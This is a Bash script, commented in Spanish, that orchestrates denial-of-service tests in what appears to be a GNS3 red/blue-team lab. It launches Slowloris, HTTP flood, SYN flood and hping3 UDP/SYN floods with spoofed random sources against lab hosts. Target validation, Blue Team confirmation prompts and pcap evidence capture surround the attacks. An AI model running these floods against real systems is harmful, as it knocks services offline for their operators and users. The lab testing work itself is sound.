#!/usr/bin/env bash
# Orquestador DoS extendido — incluye hosts Blue Team GNS3 como targets opcionales.
# Reutiliza los vectores 01/02/03 existentes sobreponiendo LAB_TARGET en el entorno.
# Ejecutar desde el contenedor Kali: bash /root/scripts/phase-6-dos/run-dos-window-bt.sh

set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${DIR}/../lib/common.sh"

PAUSE_BETWEEN_VECTORS="${PAUSE_BETWEEN_VECTORS:-300}"

echo "==========================================================="
echo " DoS WINDOW — Blue Team Extended Targets"
echo "==========================================================="
echo ""
echo " Targets disponibles:"
echo "   1) ${LAB_TARGET}  — Metasploitable2    (HTTP :80)"
echo "   2) ${BT_WEB}      — bt-web / Apache2   (HTTP :80)"
echo "   3) ${BT_DNS}      — bt-dns / BIND9     (UDP  :53)"
echo "   4) ${BT_SMB}      — bt-smb / Samba     (TCP  :445)"
echo "   5) ${BT_MAIL}     — bt-mail / Postfix  (TCP  :25)"
echo ""
read -rp " Seleccionar target (1-5): " choice

case "$choice" in
    1) TARGET="${LAB_TARGET}"; PORT=80;  PROTO="HTTP"  ;;
    2) TARGET="${BT_WEB}";     PORT=80;  PROTO="HTTP"  ;;
    3) TARGET="${BT_DNS}";     PORT=53;  PROTO="DNS"   ;;
    4) TARGET="${BT_SMB}";     PORT=445; PROTO="SMB"   ;;
    5) TARGET="${BT_MAIL}";    PORT=25;  PROTO="SMTP"  ;;
    *) echo "Opcion invalida"; exit 1 ;;
esac

validate_target "$TARGET"

echo ""
echo " Target: ${TARGET}:${PORT} (${PROTO})"
echo ""
echo " Pre-flight checklist:"
echo "   [ ] Blue Team notificado y monitoreando"
echo "   [ ] Ventana acordada (hora inicio / hora fin)"
echo "   [ ] Canal de abort establecido"
echo "   [ ] 99-monitor.sh corriendo en segunda terminal: LAB_TARGET=${TARGET} bash ${DIR}/99-monitor.sh ${PORT}"
echo ""
read -rp " Todo confirmado? Escribe YES para continuar: " confirm
[[ "$confirm" != "YES" ]] && exit 1

# ── Vectores HTTP (Metasploitable2 y bt-web) ─────────────────────────────────
if [[ "$PROTO" == "HTTP" ]]; then
    export LAB_TARGET="$TARGET"

    bash "${DIR}/00-baseline.sh"
    echo ""
    read -rp "Baseline OK. Iniciar Vector 1 (Slowloris) contra ${TARGET}:${PORT}? [y/N] " a
    [[ "$a" == "y" ]] && bash "${DIR}/01-slowloris.sh" "$PORT"

    echo "Pausando ${PAUSE_BETWEEN_VECTORS}s..."
    sleep "${PAUSE_BETWEEN_VECTORS}"
    bash "${DIR}/recovery-check.sh" "$PORT"

    read -rp "Iniciar Vector 2 (HTTP flood) contra ${TARGET}:${PORT}? [y/N] " a
    [[ "$a" == "y" ]] && bash "${DIR}/02-http-flood.sh" "$PORT"

    echo "Pausando ${PAUSE_BETWEEN_VECTORS}s..."
    sleep "${PAUSE_BETWEEN_VECTORS}"
    bash "${DIR}/recovery-check.sh" "$PORT"

    read -rp "Iniciar Vector 3 (SYN flood) contra ${TARGET}:${PORT}? [y/N] " a
    [[ "$a" == "y" ]] && bash "${DIR}/03-syn-flood.sh" "$PORT"
fi

# ── Vector DNS flood (bt-dns UDP :53) ────────────────────────────────────────
if [[ "$PROTO" == "DNS" ]]; then
    export LAB_TARGET="$TARGET"
    EVIDENCE_DIR=$(init_evidence_dir "phase-6-dos-dns")
    echo "$EVIDENCE_DIR" > /tmp/dos-evidence-dir

    banner "DoS — DNS UDP flood contra ${TARGET}:53"
    log WARN "CONFIRMAR con Blue Team antes de iniciar (y/N)"
    read -r answer; [[ "$answer" != "y" ]] && exit 1

    log INFO "Capturando pcap..."
    tcpdump -i any -w "${EVIDENCE_DIR}/dns-flood.pcap" \
        "host ${TARGET} and port 53" &
    TCPDUMP_PID=$!

    log INFO "hping3 UDP flood 30s contra ${TARGET}:53"
    START=$(date +%s)
    timeout 30 hping3 --udp -p 53 --flood --rand-source "${TARGET}" \
        > "${EVIDENCE_DIR}/dns-flood.log" 2>&1 || true
    END=$(date +%s)

    kill "$TCPDUMP_PID" 2>/dev/null || true
    log INFO "DNS flood finalizado. Duracion: $((END-START))s"
    finalize
fi

# ── Vector SMB SYN flood (bt-smb TCP :445) ───────────────────────────────────
if [[ "$PROTO" == "SMB" ]]; then
    export LAB_TARGET="$TARGET"
    bash "${DIR}/00-baseline.sh" "$PORT" 2>/dev/null || true
    bash "${DIR}/03-syn-flood.sh" "$PORT"
fi

# ── Vector SMTP SYN flood (bt-mail TCP :25) ──────────────────────────────────
if [[ "$PROTO" == "SMTP" ]]; then
    export LAB_TARGET="$TARGET"
    EVIDENCE_DIR=$(init_evidence_dir "phase-6-dos-smtp")
    echo "$EVIDENCE_DIR" > /tmp/dos-evidence-dir

    banner "DoS — SMTP SYN flood contra ${TARGET}:25"
    log WARN "CONFIRMAR con Blue Team antes de iniciar (y/N)"
    read -r answer; [[ "$answer" != "y" ]] && exit 1

    log INFO "Capturando pcap..."
    tcpdump -i any -w "${EVIDENCE_DIR}/smtp-flood.pcap" \
        "host ${TARGET} and port 25" &
    TCPDUMP_PID=$!

    log INFO "hping3 SYN flood 30s contra ${TARGET}:25"
    START=$(date +%s)
    timeout 30 hping3 -S --flood --rand-source -p 25 "${TARGET}" \
        > "${EVIDENCE_DIR}/smtp-flood.log" 2>&1 || true
    END=$(date +%s)

    kill "$TCPDUMP_PID" 2>/dev/null || true
    log INFO "SMTP flood finalizado. Duracion: $((END-START))s"
    finalize
fi

echo ""
echo "Ventana DoS extendida completa."
echo "Evidencia en: $(cat /tmp/dos-evidence-dir 2>/dev/null)"
